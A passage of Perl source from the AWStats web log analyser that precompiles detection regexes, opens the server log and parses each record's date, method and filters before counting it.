
	my $lastprocessedyear  = $lastyearbeforeupdate  || 0;
	my $lastprocessedmonth = $lastmonthbeforeupdate || 0;
	my $lastprocessedday   = $lastdaybeforeupdate   || 0;
	my $lastprocessedhour  = $lasthourbeforeupdate  || 0;
	my $lastprocesseddate  = '';
	if ( $DatabaseBreak eq 'month' ) {
		$lastprocesseddate =
		  sprintf( "%04i%02i", $lastprocessedyear, $lastprocessedmonth );
	}
	elsif ( $DatabaseBreak eq 'year' ) {
		$lastprocesseddate = sprintf( "%04i%", $lastprocessedyear );
	}
	elsif ( $DatabaseBreak eq 'day' ) {
		$lastprocesseddate = sprintf( "%04i%02i%02i",
			$lastprocessedyear, $lastprocessedmonth, $lastprocessedday );
	}
	elsif ( $DatabaseBreak eq 'hour' ) {
		$lastprocesseddate = sprintf(
			"%04i%02i%02i%02i",
			$lastprocessedyear, $lastprocessedmonth,
			$lastprocessedday,  $lastprocessedhour
		);
	}

	my @list;

	# Init RobotsSearchIDOrder required for update process
	@list = ();
	if ( $LevelForRobotsDetection >= 1 ) {
		foreach ( 1 .. $LevelForRobotsDetection ) { push @list, "list$_"; }
		push @list, "listgen";    # Always added
	}
	foreach my $key (@list) {
		no strict 'refs';
		my $varname = "RobotsSearchIDOrder_$key";
		if (defined $$varname && ref($$varname) eq 'ARRAY' && @{$$varname}) {
			push @RobotsSearchIDOrder, @{$$varname};
			if ($Debug) {
				debug(
					"Add "
					  . scalar(@{$$varname})
					  . " elements from $varname into RobotsSearchIDOrder",
					2
				);
			}
		} elsif ($Debug) {
			debug("Skip $varname - not defined or empty", 2);
		}
		use strict 'refs';
	}
	if ($Debug) {
		debug( "RobotsSearchIDOrder has now " . @RobotsSearchIDOrder . " elements",
			1
		);
	}

	# Init SearchEnginesIDOrder required for update process
	@SearchEnginesSearchIDOrder = ();
	if ( $LevelForSearchEnginesDetection >= 1 ) {
		if (@SearchEnginesSearchIDOrder_list1) {
			push @SearchEnginesSearchIDOrder, @SearchEnginesSearchIDOrder_list1;
		}
	}
	if ( $LevelForSearchEnginesDetection >= 2 ) {
		if (@SearchEnginesSearchIDOrder_list2) {
			push @SearchEnginesSearchIDOrder, @SearchEnginesSearchIDOrder_list2;
		}
	}
	if (@SearchEnginesSearchIDOrder_listgen) {
		push @SearchEnginesSearchIDOrder, @SearchEnginesSearchIDOrder_listgen;
	}
	if ($Debug) {
		debug(
			"SearchEnginesSearchIDOrder has now "
			. @SearchEnginesSearchIDOrder
			. " elements",
			1
		);
	}

	# Complete HostAliases array
	my $sitetoanalyze = quotemeta( lc($SiteDomain) );
	@HostAliases = grep { $_ ne '' } @HostAliases;
	if ( !@HostAliases ) {
		warning( "Warning: HostAliases is empty. Auto-added defaults: $SiteDomain, localhost, 127.0.0.1, ::1. To override, set HostAliases in config file." );
		push @HostAliases, qr/^$sitetoanalyze$/i;
		push @HostAliases, qr/^localhost$/i;
		push @HostAliases, qr/^127\.0\.0\.1$/i;
		push @HostAliases, qr/^::1$/i;
	}
	else {
		unshift @HostAliases, qr/^$sitetoanalyze$/i;
	}    # Add SiteDomain as first value

	# Optimize arrays
	@HostAliases = &OptimizeArray( \@HostAliases, 1 );
	if ($Debug) {
		debug( "HostAliases precompiled regex list is now @HostAliases", 1 );
	}
	@SkipDNSLookupFor = &OptimizeArray( \@SkipDNSLookupFor, 1 );
	if ($Debug) {
		debug(
			"SkipDNSLookupFor precompiled regex list is now @SkipDNSLookupFor",
			1
		);
	}
	@SkipHosts = &OptimizeArray( \@SkipHosts, 1 );
	if ($Debug) {
		debug( "SkipHosts precompiled regex list is now @SkipHosts", 1 );
	}
	@SkipReferrers = &OptimizeArray( \@SkipReferrers, 1 );
	if ($Debug) {
		debug( "SkipReferrers precompiled regex list is now @SkipReferrers",
			1 );
	}
	@SkipUserAgents = &OptimizeArray( \@SkipUserAgents, 1 );
	if ($Debug) {
		debug( "SkipUserAgents precompiled regex list is now @SkipUserAgents",
			1 );
	}
	@SkipFiles = &OptimizeArray( \@SkipFiles, $URLNotCaseSensitive );
	if ($Debug) {
		debug( "SkipFiles precompiled regex list is now @SkipFiles", 1 );
	}
	@OnlyHosts = &OptimizeArray( \@OnlyHosts, 1 );
	if ($Debug) {
		debug( "OnlyHosts precompiled regex list is now @OnlyHosts", 1 );
	}
	@OnlyUsers = &OptimizeArray( \@OnlyUsers, 1 );
	if ($Debug) {
		debug( "OnlyUsers precompiled regex list is now @OnlyUsers", 1 );
	}
	@OnlyUserAgents = &OptimizeArray( \@OnlyUserAgents, 1 );
	if ($Debug) {
		debug( "OnlyUserAgents precompiled regex list is now @OnlyUserAgents",
			1 );
	}
	@OnlyFiles = &OptimizeArray( \@OnlyFiles, $URLNotCaseSensitive );
	if ($Debug) {
		debug( "OnlyFiles precompiled regex list is now @OnlyFiles", 1 );
	}
	@NotPageFiles = &OptimizeArray( \@NotPageFiles, $URLNotCaseSensitive );
	if ($Debug) {
		debug( "NotPageFiles precompiled regex list is now @NotPageFiles", 1 );
	}

	# Precompile the regex search strings with qr
	@RobotsSearchIDOrder        = map { qr/$_/i } @RobotsSearchIDOrder;
	@WormsSearchIDOrder         = map { qr/$_/i } @WormsSearchIDOrder;
	@BrowsersSearchIDOrder      = map { qr/$_/i } @BrowsersSearchIDOrder;
	@OSSearchIDOrder            = map { qr/$_/i } @OSSearchIDOrder;
	@SearchEnginesSearchIDOrder = map { qr/$_/i } @SearchEnginesSearchIDOrder;
	my $miscquoted     = quotemeta("$MiscTrackerUrl");
	my $defquoted      = quotemeta("/$DefaultFile[0]");
	my $sitewithoutwww = lc($SiteDomain);
	$sitewithoutwww =~ s/www\.//;
	$sitewithoutwww = quotemeta($sitewithoutwww);

	# Define precompiled regex
	my $regmisc        = qr/^$miscquoted/;
	my $regfavico      = qr/\/favicon\.ico$/i;
	my $regicons = qr/
		\/favicon\.(ico|png|gif|svg|webp|avif) |
		\/apple-touch-icon(?:-precomposed)?(?:-\d+x\d+)?\.(png|webp|avif) |
		\/logo\.(png|svg|jpg|jpeg|gif|webp|avif) |
		\/core_icon\.(png|webp|avif) |
		\/style_icon\.(png|webp|avif) |
		\/icon\.(png|svg|webp|avif) |
		\/images\/.*_icon\.(png|webp|avif) |
		\/themes\/.*\/images\/.*_icon\.(png|webp|avif) |
		\/manifest\.(json|webmanifest) |
		\/browserconfig\.xml |
		\/safari-pinned-tab\.svg
	/ix;
	my $regrobot       = qr/\/robots\.txt$/i;
	my $regtruncanchor = qr/#(\w*)$/;
	my $regtruncurl    = qr/([$URLQuerySeparators])(.*)$/;
	my $regext         = qr/\.(\w{1,6})$/;
	my $regdefault;
	if ($URLNotCaseSensitive) { $regdefault = qr/$defquoted$/i; }
	else { $regdefault = qr/$defquoted$/; }
	my $regipv4           = qr/^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/;
	my $regipv4l          = qr/^::ffff:\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/;
	my $regipv6           = qr/^[0-9A-F]*:/i;
	my $regverbrave      = qr/brave\/([\d\.]+)/i;
	my $regvervivaldi    = qr/vivaldi\/([\d\.]+)/i;
	my $regveryandex     = qr/yabrowser\/([\d\.]+)/i;
	my $regverwhale      = qr/whale\/([\d\.]+)/i;
	my $regveredg        = qr/edg\/([\d\.]+)/i;      # Edge Chromium
	my $regveropr        = qr/opr\/([\d\.]+)/i;      # Opera Chromium
	my $regveredge        = qr/edge\/([\d]+)/i;
	my $regvermsie        = qr/msie([+_ ]|)([\d\.]+)/i;
	my $regvermsie11      = qr/trident\/7\.\d*\;([a-zA-Z;+_ ]+|)rv:([\d\.]+)/i;
	my $regvernetscape    = qr/netscape.?\/([\d\.]+)/i;
	my $regverfirefox     = qr/firefox\/([\d\.]+)/i;
	# For Opera:
	# OPR/15.0.1266 means Opera 15 
	# Opera/9.80 ...... Version/12.16 means Opera 12.16
	# Mozilla/5.0 .... Opera 11.51 means Opera 11.51
	my $regveropera = qr/opera\/9\.80\s.+\sversion\/([\d\.]+)|ope?ra?[\/\s]([\d\.]+)/i;
	my $regversafari      = qr/safari\/([\d\.]+)/i;
	my $regversafariver   = qr/version\/([\d\.]+)/i;
	my $regverchrome      = qr/chrome\/([\d\.]+)/i;
	my $regverkonqueror   = qr/konqueror\/([\d\.]+)/i;
	my $regversvn         = qr/svn\/([\d\.]+)/i;
	my $regvermozilla     = qr/mozilla(\/|)([\d\.]+)/i;
	my $regnotie          = qr/webtv|omniweb|opera/i;
	my $regnotnetscape    = qr/gecko|compatible|opera|galeon|safari|charon/i;
	my $regnotfirefox     = qr/flock/i;
	my $regnotsafari      = qr/android|arora|chrome|shiira|webpositive/i;
	my $regreferer        = qr/^(\w+):\/\/([^\/:]+)(:\d+|)/;
	my $regreferernoquery = qr/^([^$URLQuerySeparators]+)/;
	my $reglocal          = qr/^(www\.|)$sitewithoutwww/i;
	my $regget            = qr/get|out/i;
	my $regsent           = qr/sent|put|in/i;
	# Define value of $pos_xxx, @fieldlib, $PerlParsingFormat
	&DefinePerlParsingFormat($LogFormat);

	# Load DNS Cache Files
	#------------------------------------------
	if ($DNSLookup) {
		&Read_DNS_Cache( \%MyDNSTable, "$DNSStaticCacheFile", "", 1 ); # Load with save into a second plugin file if plugin enabled and second file not up to date. No use of FileSuffix
		if ( $DNSLookup == 1 ) {    # System DNS lookup required
			 #if (! eval("use Socket;")) { error("Failed to load perl module Socket."); }
			 #use Socket;
			&Read_DNS_Cache( \%TmpDNSLookup, "$DNSLastUpdateCacheFile",
				"$FileSuffix", 0 );    # Load with no save into a second plugin file. Use FileSuffix
		}
	}

	# Processing log
	#------------------------------------------

	if ($EnableLockForUpdate) {

		# Trap signals to remove lock
		$SIG{INT} = \&SigHandler;    # 2
		#$SIG{KILL} = \&SigHandler;	# 9
		#$SIG{TERM} = \&SigHandler;	# 15
		# Set AWStats update lock
		&Lock_Update(1);
	}

	if ($Debug) {
		debug("Start Update process (lastprocesseddate=$lastprocesseddate)");
	}

	# Open log file
	if ($Debug) { debug("Open log file \"$LogFile\""); }
	open( LOG, "$LogFile" ) || error("Couldn't open server log file \"$LogFile\" : $!");
	binmode LOG;
	# Avoid premature EOF due to log files corrupted with \cZ or bin chars

	# Define local variables for loop scan
	my @field               = ();
	my $counterforflushtest = 0;
	my $qualifdrop          = '';
	my $countedtraffic      = 0;

	# Reset chrono for benchmark (first call to GetDelaySinceStart)
	&GetDelaySinceStart(1);
	if ( !scalar keys %HTMLOutput ) {
		print "Phase 1 : First bypass old records, searching new record...\n";
	}

	# Can we try a direct seek access in log ?
	my $line;
	if ( $LastLine && $LastLineNumber && $LastLineOffset && $LastLineChecksum )
	{

		# Try a direct seek access to save time
		if ($Debug) {
			debug( "Try a direct access to LastLine=$LastLine, LastLineNumber=$LastLineNumber, LastLineOffset=$LastLineOffset, LastLineChecksum=$LastLineChecksum"
			);
		}
		seek( LOG, $LastLineOffset, 0 );
		if ( $line = <LOG> ) {
			chomp $line;
			$line =~ s/\r$//;
			@field = map( /$PerlParsingFormat/, $line );
			if ($Debug) {
				my $string = '';
				foreach ( 0 .. @field - 1 ) {
					$string .= "$fieldlib[$_]=$field[$_] ";
				}
				if ($Debug) {
					debug( " Read line after direct access: $string", 1 );
				}
			}
			my $checksum = &CheckSum($line);
			if ($Debug) {
				debug( " LastLineChecksum=$LastLineChecksum, Read line checksum=$checksum",
					1
				);
			}
			if ( $checksum == $LastLineChecksum ) {
				if ( !scalar keys %HTMLOutput ) {
					print "Direct access after last parsed record (after line $LastLineNumber)\n";
				}
				$lastlinenb         = $LastLineNumber;
				$lastlineoffset     = $LastLineOffset;
				$lastlineoffsetnext = tell LOG;
				$NewLinePhase       = 1;
			}
			else {
				if ( !scalar keys %HTMLOutput ) {
					print "Direct access to last remembered record has fallen on another record.\nSo searching new records from beginning of log file...\n";
				}
				$lastlinenb         = 0;
				$lastlineoffset     = 0;
				$lastlineoffsetnext = 0;
				seek( LOG, 0, 0 );
			}
		}
		else {
			if ( !scalar keys %HTMLOutput ) {
				print "Direct access to last remembered record is out of file.\nSo searching it from beginning of log file...\n";
			}
			$lastlinenb         = 0;
			$lastlineoffset     = 0;
			$lastlineoffsetnext = 0;
			seek( LOG, 0, 0 );
		}
	}
	else {

		# No try of direct seek access
		if ( !scalar keys %HTMLOutput ) {
			print "Searching new records from beginning of log file...\n";
		}
		$lastlinenb         = 0;
		$lastlineoffset     = 0;
		$lastlineoffsetnext = 0;
	}

	#
	# Loop on each log line
	#
	while ( $line = <LOG> ) {
		
		# 20080525 BEGIN Patch to test if first char of $line = hex "00" then conclude corrupted with binary code
		my $FirstHexChar;
		$FirstHexChar = sprintf( "%02X", ord( substr( $line, 0, 1 ) ) );
		if ( $FirstHexChar eq '00' ) {
			$NbOfLinesCorrupted++;
			if ($ShowCorrupted) {
				print "Corrupted record line "
				  . ( $lastlinenb + $NbOfLinesParsed )
				  . " (record starts with hex 00; binary code): $line\n";
			}
			if (   $NbOfLinesParsed >= $NbOfLinesForCorruptedLog
				&& $NbOfLinesParsed == $NbOfLinesCorrupted )
			{
				error( "Format error", $line, $LogFile );
			}    # Exit with format error
			next;
		}
		# 20080525 END

		chomp $line;
		$line =~ s/\r$//;
		if ( $UpdateFor && $NbOfLinesParsed >= $UpdateFor ) { last; }
		$NbOfLinesParsed++;

		$lastlineoffset     = $lastlineoffsetnext;
		$lastlineoffsetnext = tell LOG;

		if ($ShowSteps) {
			if ( ( ++$NbOfLinesShowsteps & $NBOFLINESFORBENCHMARK ) == 0 ) {
				my $delay = &GetDelaySinceStart(0);
				print "$NbOfLinesParsed lines processed ("
				  . ( $delay > 0 ? $delay : 1000 ) . " ms, "
				  . int(
					1000 * $NbOfLinesShowsteps / ( $delay > 0 ? $delay : 1000 )
				  )
				  . " lines/second)\n";
			}
		}

		if ( $LogFormat eq '2' && $line =~ /^#Fields:/ ) {
			my @fixField = map( /^#Fields: (.*)/, $line );
			if ( $fixField[0] !~ /s-kernel-time/ ) {
				debug( "Found new log format: '" . $fixField[0] . "'", 1 );
				&DefinePerlParsingFormat( $fixField[0] );
			}
		}

		# Parse line record to get all required fields
		my $json_error = undef;
		if (defined $PerlParsingFormatJsonMap) {
			my $json = undef;
			try {
				$json = JSON::XS->new->utf8->decode($line);
			}
			catch {
				my $err = shift;
				$json_error = $err;
				$json_error =~ s/^\s+|\s+$//g;
			};
			@field = ();
			if ($json) {
				for my $el (@fieldlib) {
					my $json_key = ${$PerlParsingFormatJsonMap}{$el};
					push(@field, ${$json}{$json_key});
				}
			}
		} else {
			@field = map( /$PerlParsingFormat/, $line );
		}
		if ( !@field ) {
			# see if the line is a comment, blank or corrupted
 			if ( $line =~ /^#/ || $line =~ /^!/ ) {
				$NbOfLinesComment++;
				if ($ShowCorrupted){
					print "Comment record line "
					  . ( $lastlinenb + $NbOfLinesParsed )
					  . ": $line\n";
				}
 			}
 			elsif ( $line =~ /^\s*$/ ) {
 				$NbOfLinesBlank++;
				if ($ShowCorrupted){
					print "Blank record line "
					  . ( $lastlinenb + $NbOfLinesParsed )
					  . "\n";
				}
 			}else{
 				$NbOfLinesCorrupted++;
 				if ($ShowCorrupted){
					my $err = $json_error ? $json_error : "record format does not match LogFormat parameter";
 				print "Corrupted record line "
  					  . ( $lastlinenb + $NbOfLinesParsed )
					  . " ($err): $line\n";
  				}
			}
			if (   $NbOfLinesParsed >= $NbOfLinesForCorruptedLog
				&& $NbOfLinesParsed == ($NbOfLinesCorrupted + $NbOfLinesComment + $NbOfLinesBlank))
			{
				error( "Format error", $line, $LogFile );
			}    # Exit with format error
			if ( $line =~ /^__end_of_file__/i ) { last; } # For test purpose only
			next;
		}

		if ($Debug) {
			my $string = '';
			foreach ( 0 .. @field - 1 ) {
				$string .= "$fieldlib[$_]=$field[$_] ";
			}
			if ($Debug) {
				debug(
					" Correct format line "
					  . ( $lastlinenb + $NbOfLinesParsed )
					  . ": $string",
					4
				);
			}
		}

		# Drop wrong virtual host name
		#----------------------------------------------------------------------
		if ( $pos_vh >= 0 && $field[$pos_vh] !~ /^$SiteDomain$/i ) {
			my $skip = 1;
			foreach (@HostAliases) {
				if ( $field[$pos_vh] =~ /$_/ ) { $skip = 0; last; }
			}
			if ($skip) {
				$NbOfLinesDropped++;
				if ($ShowDropped) {
					print "Dropped record (virtual hostname '$field[$pos_vh]' does not match SiteDomain='$SiteDomain' nor HostAliases parameters): $line\n";
				}
				next;
			}
		}

		# Drop wrong method/protocol
		#---------------------------
		if ( $LogType ne 'M' ) { $field[$pos_url] =~ s/\s/%20/g; }
		if (
			$LogType eq 'W'
			&& (
				   $field[$pos_method] eq 'GET'
				|| $field[$pos_method] eq 'POST'
				|| $field[$pos_method] eq 'HEAD'
				|| $field[$pos_method] eq 'PROPFIND'
				|| $field[$pos_method] eq 'CHECKOUT'
				|| $field[$pos_method] eq 'LOCK'
				|| $field[$pos_method] eq 'PROPPATCH'
				|| $field[$pos_method] eq 'OPTIONS'
				|| $field[$pos_method] eq 'MKACTIVITY'
				|| $field[$pos_method] eq 'PUT'
				|| $field[$pos_method] eq 'MERGE'
				|| $field[$pos_method] eq 'DELETE'
				|| $field[$pos_method] eq 'REPORT'
				|| $field[$pos_method] eq 'MKCOL'
				|| $field[$pos_method] eq 'COPY'
				|| $field[$pos_method] eq 'RPC_IN_DATA'
				|| $field[$pos_method] eq 'RPC_OUT_DATA'
				|| $field[$pos_method] eq 'OK'             # Webstar
				|| $field[$pos_method] eq 'ERR!'           # Webstar
				|| $field[$pos_method] eq 'PRIV'           # Webstar
			)
		  )
		{

		# HTTP request.	Keep only GET, POST, HEAD, *OK* and ERR! for Webstar. Do not keep OPTIONS, TRACE
		}
		elsif (
			( $LogType eq 'W' || $LogType eq 'S' )
			&& (   uc($field[$pos_method]) eq 'GET'
				|| uc($field[$pos_method]) eq 'MMS'
				|| uc($field[$pos_method]) eq 'RTSP'
				|| uc($field[$pos_method]) eq 'HTTP'
				|| uc($field[$pos_method]) eq 'RTP' )
		  )
		{

		# Streaming request (WebRTC, WebCodecs, HLS, DASH)
		}
		elsif ( $LogType eq 'M' && $field[$pos_method] eq 'SMTP' ) {

		# Mail request ('SMTP' for mail log with maillogconvert.pl preprocessor)
		}
		elsif (
			$LogType eq 'F'
			&& (   $field[$pos_method] eq 'RETR'
				|| $field[$pos_method] eq 'D'
				|| $field[$pos_method] eq 'o'
				|| $field[$pos_method] =~ /$regget/o )
		  )
		{

			# FTP GET request
		}
		elsif (
			$LogType eq 'F'
			&& (   $field[$pos_method] eq 'STOR'
				|| $field[$pos_method] eq 'U'
				|| $field[$pos_method] eq 'i'
				|| $field[$pos_method] =~ /$regsent/o )
		  )
		{

			# FTP SENT request
		}
		elsif($line =~ m/#Fields:/){
 			# log #fields as comment
 			$NbOfLinesComment++;
 			next;			
 		}else{
			$NbOfLinesDropped++;
			if ($ShowDropped) {
				print "Dropped record (method/protocol '$field[$pos_method]' not qualified when LogType=$LogType): $line\n";
			}
			next;
		}

		# Reformat date for IIS date -DWG 12/8/2008
		if($field[$pos_date] =~ /,/)
		{
			$field[$pos_date] =~ s/,//;
			my @split_date = split(' ',$field[$pos_date]);
			my @dateparts2= split('/',$split_date[0]);
			my @timeparts2= split(':',$split_date[1]);
			#add leading zero
			for($dateparts2[0],$dateparts2[1], $timeparts2[0], $timeparts2[1],  $timeparts2[2])			{
				if($_ =~ /^.$/)
				{
					$_ = '0'.$_;
				}

			}

			$field[$pos_date] = "$dateparts2[2]-$dateparts2[0]-$dateparts2[1] $timeparts2[0]:$timeparts2[1]:$timeparts2[2]";
		}
		
		$field[$pos_date] =~
		  tr/,-\/ \tT/::::::/s;  # " \t" is used instead of "\s" not known with tr
		my @dateparts =
		  split( /:/, $field[$pos_date] ); # tr and split faster than @dateparts=split(/[\/\-:\s]/,$field[$pos_date])
		 # Detected date format: 
		 # dddddddddd, YYYY-MM-DD HH:MM:SS (IIS), MM/DD/YY\tHH:MM:SS,
		 # DD/Month/YYYY:HH:MM:SS (Apache), DD/MM/YYYY HH:MM:SS, Mon DD HH:MM:SS,
		 # YYYY-MM-DDTHH:MM:SS (iso)
		if ( !$dateparts[1] ) {    # Unix timestamp
			(
				$dateparts[5], $dateparts[4], $dateparts[3],
				$dateparts[0], $dateparts[1], $dateparts[2]
			  )
			  = localtime( int( $field[$pos_date] ) );
			$dateparts[1]++;
			$dateparts[2] += 1900;
		}
		elsif ( $dateparts[0] =~ /^....$/ ) {
			my $tmp = $dateparts[0];
			$dateparts[0] = $dateparts[2];
			$dateparts[2] = $tmp;
		}
		elsif ( $field[$pos_date] =~ /^..:..:..:/ ) {
			$dateparts[2] += 2000;
			my $tmp = $dateparts[0];
			$dateparts[0] = $dateparts[1];
			$dateparts[1] = $tmp;
		}
		elsif ( $dateparts[0] =~ /^...$/ ) {
			my $tmp = $dateparts[0];
			$dateparts[0] = $dateparts[1];
			$dateparts[1] = $tmp;
			$tmp          = $dateparts[5];
			$dateparts[5] = $dateparts[4];
			$dateparts[4] = $dateparts[3];
			$dateparts[3] = $dateparts[2];
			$dateparts[2] = $tmp || $nowyear;
		}
		if ( exists( $MonthNum{ $dateparts[1] } ) ) {
			$dateparts[1] = $MonthNum{ $dateparts[1] };
		}    # Change lib month in num month if necessary
		if ( $dateparts[1] <= 0 )
		{ # Date corrupted (for example $dateparts[1]='dic' for december month in a spanish log file)
			$NbOfLinesCorrupted++;
			if ($ShowCorrupted) {
				print "Corrupted record line "
				  . ( $lastlinenb + $NbOfLinesParsed )
				  . " (bad date format for month, may be month are not in english ?): $line\n";
			}
			next;
		}

		# Now @dateparts is (DD,MM,YYYY,HH,MM,SS) and we're going to create $timerecord=YYYYMMDDHHMMSS
		if ( $PluginsLoaded{'ChangeTime'}{'timezone'} ) {
			@dateparts = ChangeTime_timezone( \@dateparts );
		}
		my $yearrecord  = int( $dateparts[2] );
		my $monthrecord = int( $dateparts[1] );
		my $dayrecord   = int( $dateparts[0] );
		my $hourrecord  = int( $dateparts[3] );
		my $daterecord  = '';
		if ( $DatabaseBreak eq 'month' ) {
			$daterecord = sprintf( "%04i%02i", $yearrecord, $monthrecord );
		}
		elsif ( $DatabaseBreak eq 'year' ) {
			$daterecord = sprintf( "%04i%", $yearrecord );
		}
		elsif ( $DatabaseBreak eq 'day' ) {
			$daterecord =
			  sprintf( "%04i%02i%02i", $yearrecord, $monthrecord, $dayrecord );
		}
		elsif ( $DatabaseBreak eq 'hour' ) {
			$daterecord = sprintf( "%04i%02i%02i%02i",
				$yearrecord, $monthrecord, $dayrecord, $hourrecord );
		}

		# TODO essayer de virer yearmonthrecord
		my $yearmonthdayrecord =
		  sprintf( "$dateparts[2]%02i%02i", $dateparts[1], $dateparts[0] );
		my $timerecord =
		  ( ( int("$yearmonthdayrecord") * 100 + $dateparts[3] ) * 100 +
			  $dateparts[4] ) * 100 + $dateparts[5];

		# Check date
		#-----------------------
		if ( $LogType eq 'M' && $timerecord > $tomorrowtime ) {

			# Postfix/Sendmail does not store year, so we assume that year is year-1 if record is in future
			$yearrecord--;
			if ( $DatabaseBreak eq 'month' ) {
				$daterecord = sprintf( "%04i%02i", $yearrecord, $monthrecord );
			}
			elsif ( $DatabaseBreak eq 'year' ) {
				$daterecord = sprintf( "%04i%", $yearrecord );
			}
			elsif ( $DatabaseBreak eq 'day' ) {
				$daterecord = sprintf( "%04i%02i%02i",
					$yearrecord, $monthrecord, $dayrecord );
			}
			elsif ( $DatabaseBreak eq 'hour' ) {
				$daterecord = sprintf( "%04i%02i%02i%02i",
					$yearrecord, $monthrecord, $dayrecord, $hourrecord );
			}

			# TODO essayer de virer yearmonthrecord
			$yearmonthdayrecord =
			  sprintf( "$yearrecord%02i%02i", $dateparts[1], $dateparts[0] );
			$timerecord =
			  ( ( int("$yearmonthdayrecord") * 100 + $dateparts[3] ) * 100 +
				  $dateparts[4] ) * 100 + $dateparts[5];
		}
		if ( $timerecord < 10000000000000 || $timerecord > $tomorrowtime ) {
			$NbOfLinesCorrupted++;
			if ($ShowCorrupted) {
				print "Corrupted record (invalid date, timerecord=$timerecord): $line\n";
			}
			next;   # Should not happen, kept in case of parasite/corrupted line
		}
		if ($NewLinePhase) {

			# TODO NOTSORTEDRECORDTOLERANCE does not work around midnight
			if ( $timerecord < ( $LastLine - $NOTSORTEDRECORDTOLERANCE ) ) {

				# Should not happen, kept in case of parasite/corrupted old line
				$NbOfLinesCorrupted++;
				if ($ShowCorrupted) {
					print "Corrupted record (date $timerecord lower than $LastLine-$NOTSORTEDRECORDTOLERANCE): $line\n";
				}
				next;
			}
		}
		else {
			if ( $timerecord <= $LastLine ) {    # Already processed
				$NbOfOldLines++;
				next;
			}

			# We found a new line. This will replace comparison "<=" with "<" between timerecord and LastLine (we should have only new lines now)
			$NewLinePhase = 1;    # We will never enter here again
			if ($ShowSteps) {
				if ( $NbOfLinesShowsteps > 1
					&& ( $NbOfLinesShowsteps & $NBOFLINESFORBENCHMARK ) )
				{
					my $delay = &GetDelaySinceStart(0);
					print ""
					  . ( $NbOfLinesParsed - 1 )
					  . " lines processed ("
					  . ( $delay > 0 ? $delay : 1000 ) . " ms, "
					  . int( 1000 * ( $NbOfLinesShowsteps - 1 ) /
						  ( $delay > 0 ? $delay : 1000 ) )
					  . " lines/second)\n";
				}
				&GetDelaySinceStart(1);
				$NbOfLinesShowsteps = 1;
			}
			if ( !scalar keys %HTMLOutput ) {
				print "Phase 2 : Now process new records (Flush history on disk after "
				  . ( $LIMITFLUSH << 2 )
				  . " hosts)...\n";

			#print "Phase 2 : Now process new records (Flush history on disk after ".($LIMITFLUSH<<2)." hosts or ".($LIMITFLUSH)." URLs)...\n";
			}
		}

		# Convert URL for Webstar to common URL
		if ( $LogFormat eq '3' ) {
			$field[$pos_url] =~ s/:/\//g;
			if ( $field[$pos_code] eq '-' ) { $field[$pos_code] = '200'; }
		}

		# Here, field array, timerecord and yearmonthdayrecord are initialized for log record
		if ($Debug) {
			debug( "  This is a not already processed record ($timerecord)",
				4 );
		}

		# Check if there's a CloudFlare Visitor IP in the query string
		# If it does, replace the ip
		if ( $pos_query >= 0 && $field[$pos_query] && $field[$pos_query] =~ /\[CloudFlare_Visitor_IP[:](\d+[.]\d+[.]\d+[.]\d+)\]/ ) {
			$field[$pos_host] = "$1";
		}	

		# We found a new line
		#----------------------------------------
		if ( $timerecord > $LastLine ) {
			$LastLine = $timerecord;
		}    # Test should always be true except with not sorted log files

		# Skip for some client host IP addresses, some URLs, other URLs
		if (
			@SkipHosts
			&& ( &SkipHost( $field[$pos_host] )
				|| ( $pos_hostr && &SkipHost( $field[$pos_hostr] ) ) )
		  )
		{
			$qualifdrop = "Dropped record (host $field[$pos_host]"
			  . ( $pos_hostr ? " and $field[$pos_hostr]" : "" )
			  . " not qualified by SkipHosts)";
		}
		elsif ( @SkipFiles && &SkipFile( $field[$pos_url] ) ) {
			$qualifdrop = "Dropped record (URL $field[$pos_url] not qualified by SkipFiles)";
		}
		elsif (@SkipUserAgents
			&& $pos_agent >= 0
			&& &SkipUserAgent( $field[$pos_agent] ) )
		{
			$qualifdrop = "Dropped record (user agent '$field[$pos_agent]' not qualified by SkipUserAgents)";
		}
		elsif (@SkipReferrers
			&& $pos_referer >= 0
			&& &SkipReferrer( $field[$pos_referer] ) )
		{
			$qualifdrop = "Dropped record (URL $field[$pos_referer] not qualified by SkipReferrers)";
		}
		elsif (@OnlyHosts
			&& !&OnlyHost( $field[$pos_host] )
			&& ( !$pos_hostr || !&OnlyHost( $field[$pos_hostr] ) ) )
		{
			$qualifdrop = "Dropped record (host $field[$pos_host]"
			  . ( $pos_hostr ? " and $field[$pos_hostr]" : "" )
			  . " not qualified by OnlyHosts)";
		}
		elsif ( @OnlyUsers && !&OnlyUser( $field[$pos_logname] ) ) {
			$qualifdrop = "Dropped record (URL $field[$pos_logname] not qualified by OnlyUsers)";
		}
		elsif ( @OnlyFiles && !&OnlyFile( $field[$pos_url] ) ) {
			$qualifdrop = "Dropped record (URL $field[$pos_url] not qualified by OnlyFiles)";
		}
		elsif ( @OnlyUserAgents && !&OnlyUserAgent( $field[$pos_agent] ) ) {
			$qualifdrop = "Dropped record (user agent '$field[$pos_agent]' not qualified by OnlyUserAgents)";
		}
		if ($qualifdrop) {
			$NbOfLinesDropped++;
			if ($Debug) { debug( "$qualifdrop: $line", 4 ); }
			if ($ShowDropped) { print "$qualifdrop: $line\n"; }
			$qualifdrop = '';
			next;
		}

		# Record is approved
		#-------------------

		# Is it in a new break section ?
		#-------------------------------
		if ( $daterecord > $lastprocesseddate ) {

			# A new break to process
			if ( $lastprocesseddate > 0 ) {

				# We save data of previous break
				&Read_History_With_TmpUpdate(
					$lastprocessedyear, $lastprocessedmonth,
					$lastprocessedday,  $lastprocessedhour,
					1,                  1,
					"all", ( $lastlinenb + $NbOfLinesParsed ),
					$lastlineoffset, &CheckSum($line)
				);
				$counterforflushtest = 0;    # We reset counterforflushtest
			}
			$lastprocessedyear  = $yearrecord;
			$lastprocessedmonth = $monthrecord;
			$lastprocessedday   = $dayrecord;
			$lastprocessedhour  = $hourrecord;
			if ( $DatabaseBreak eq 'month' ) {
				$lastprocesseddate =
				  sprintf( "%04i%02i", $yearrecord, $monthrecord );
			}
			elsif ( $DatabaseBreak eq 'year' ) {
				$lastprocesseddate = sprintf( "%04i%", $yearrecord );
			}
			elsif ( $DatabaseBreak eq 'day' ) {
				$lastprocesseddate = sprintf( "%04i%02i%02i",
					$yearrecord, $monthrecord, $dayrecord );
			}
			elsif ( $DatabaseBreak eq 'hour' ) {
				$lastprocesseddate = sprintf( "%04i%02i%02i%02i",
					$yearrecord, $monthrecord, $dayrecord, $hourrecord );
			}
		}

		$countedtraffic = 0;
		$NbOfNewLines++;
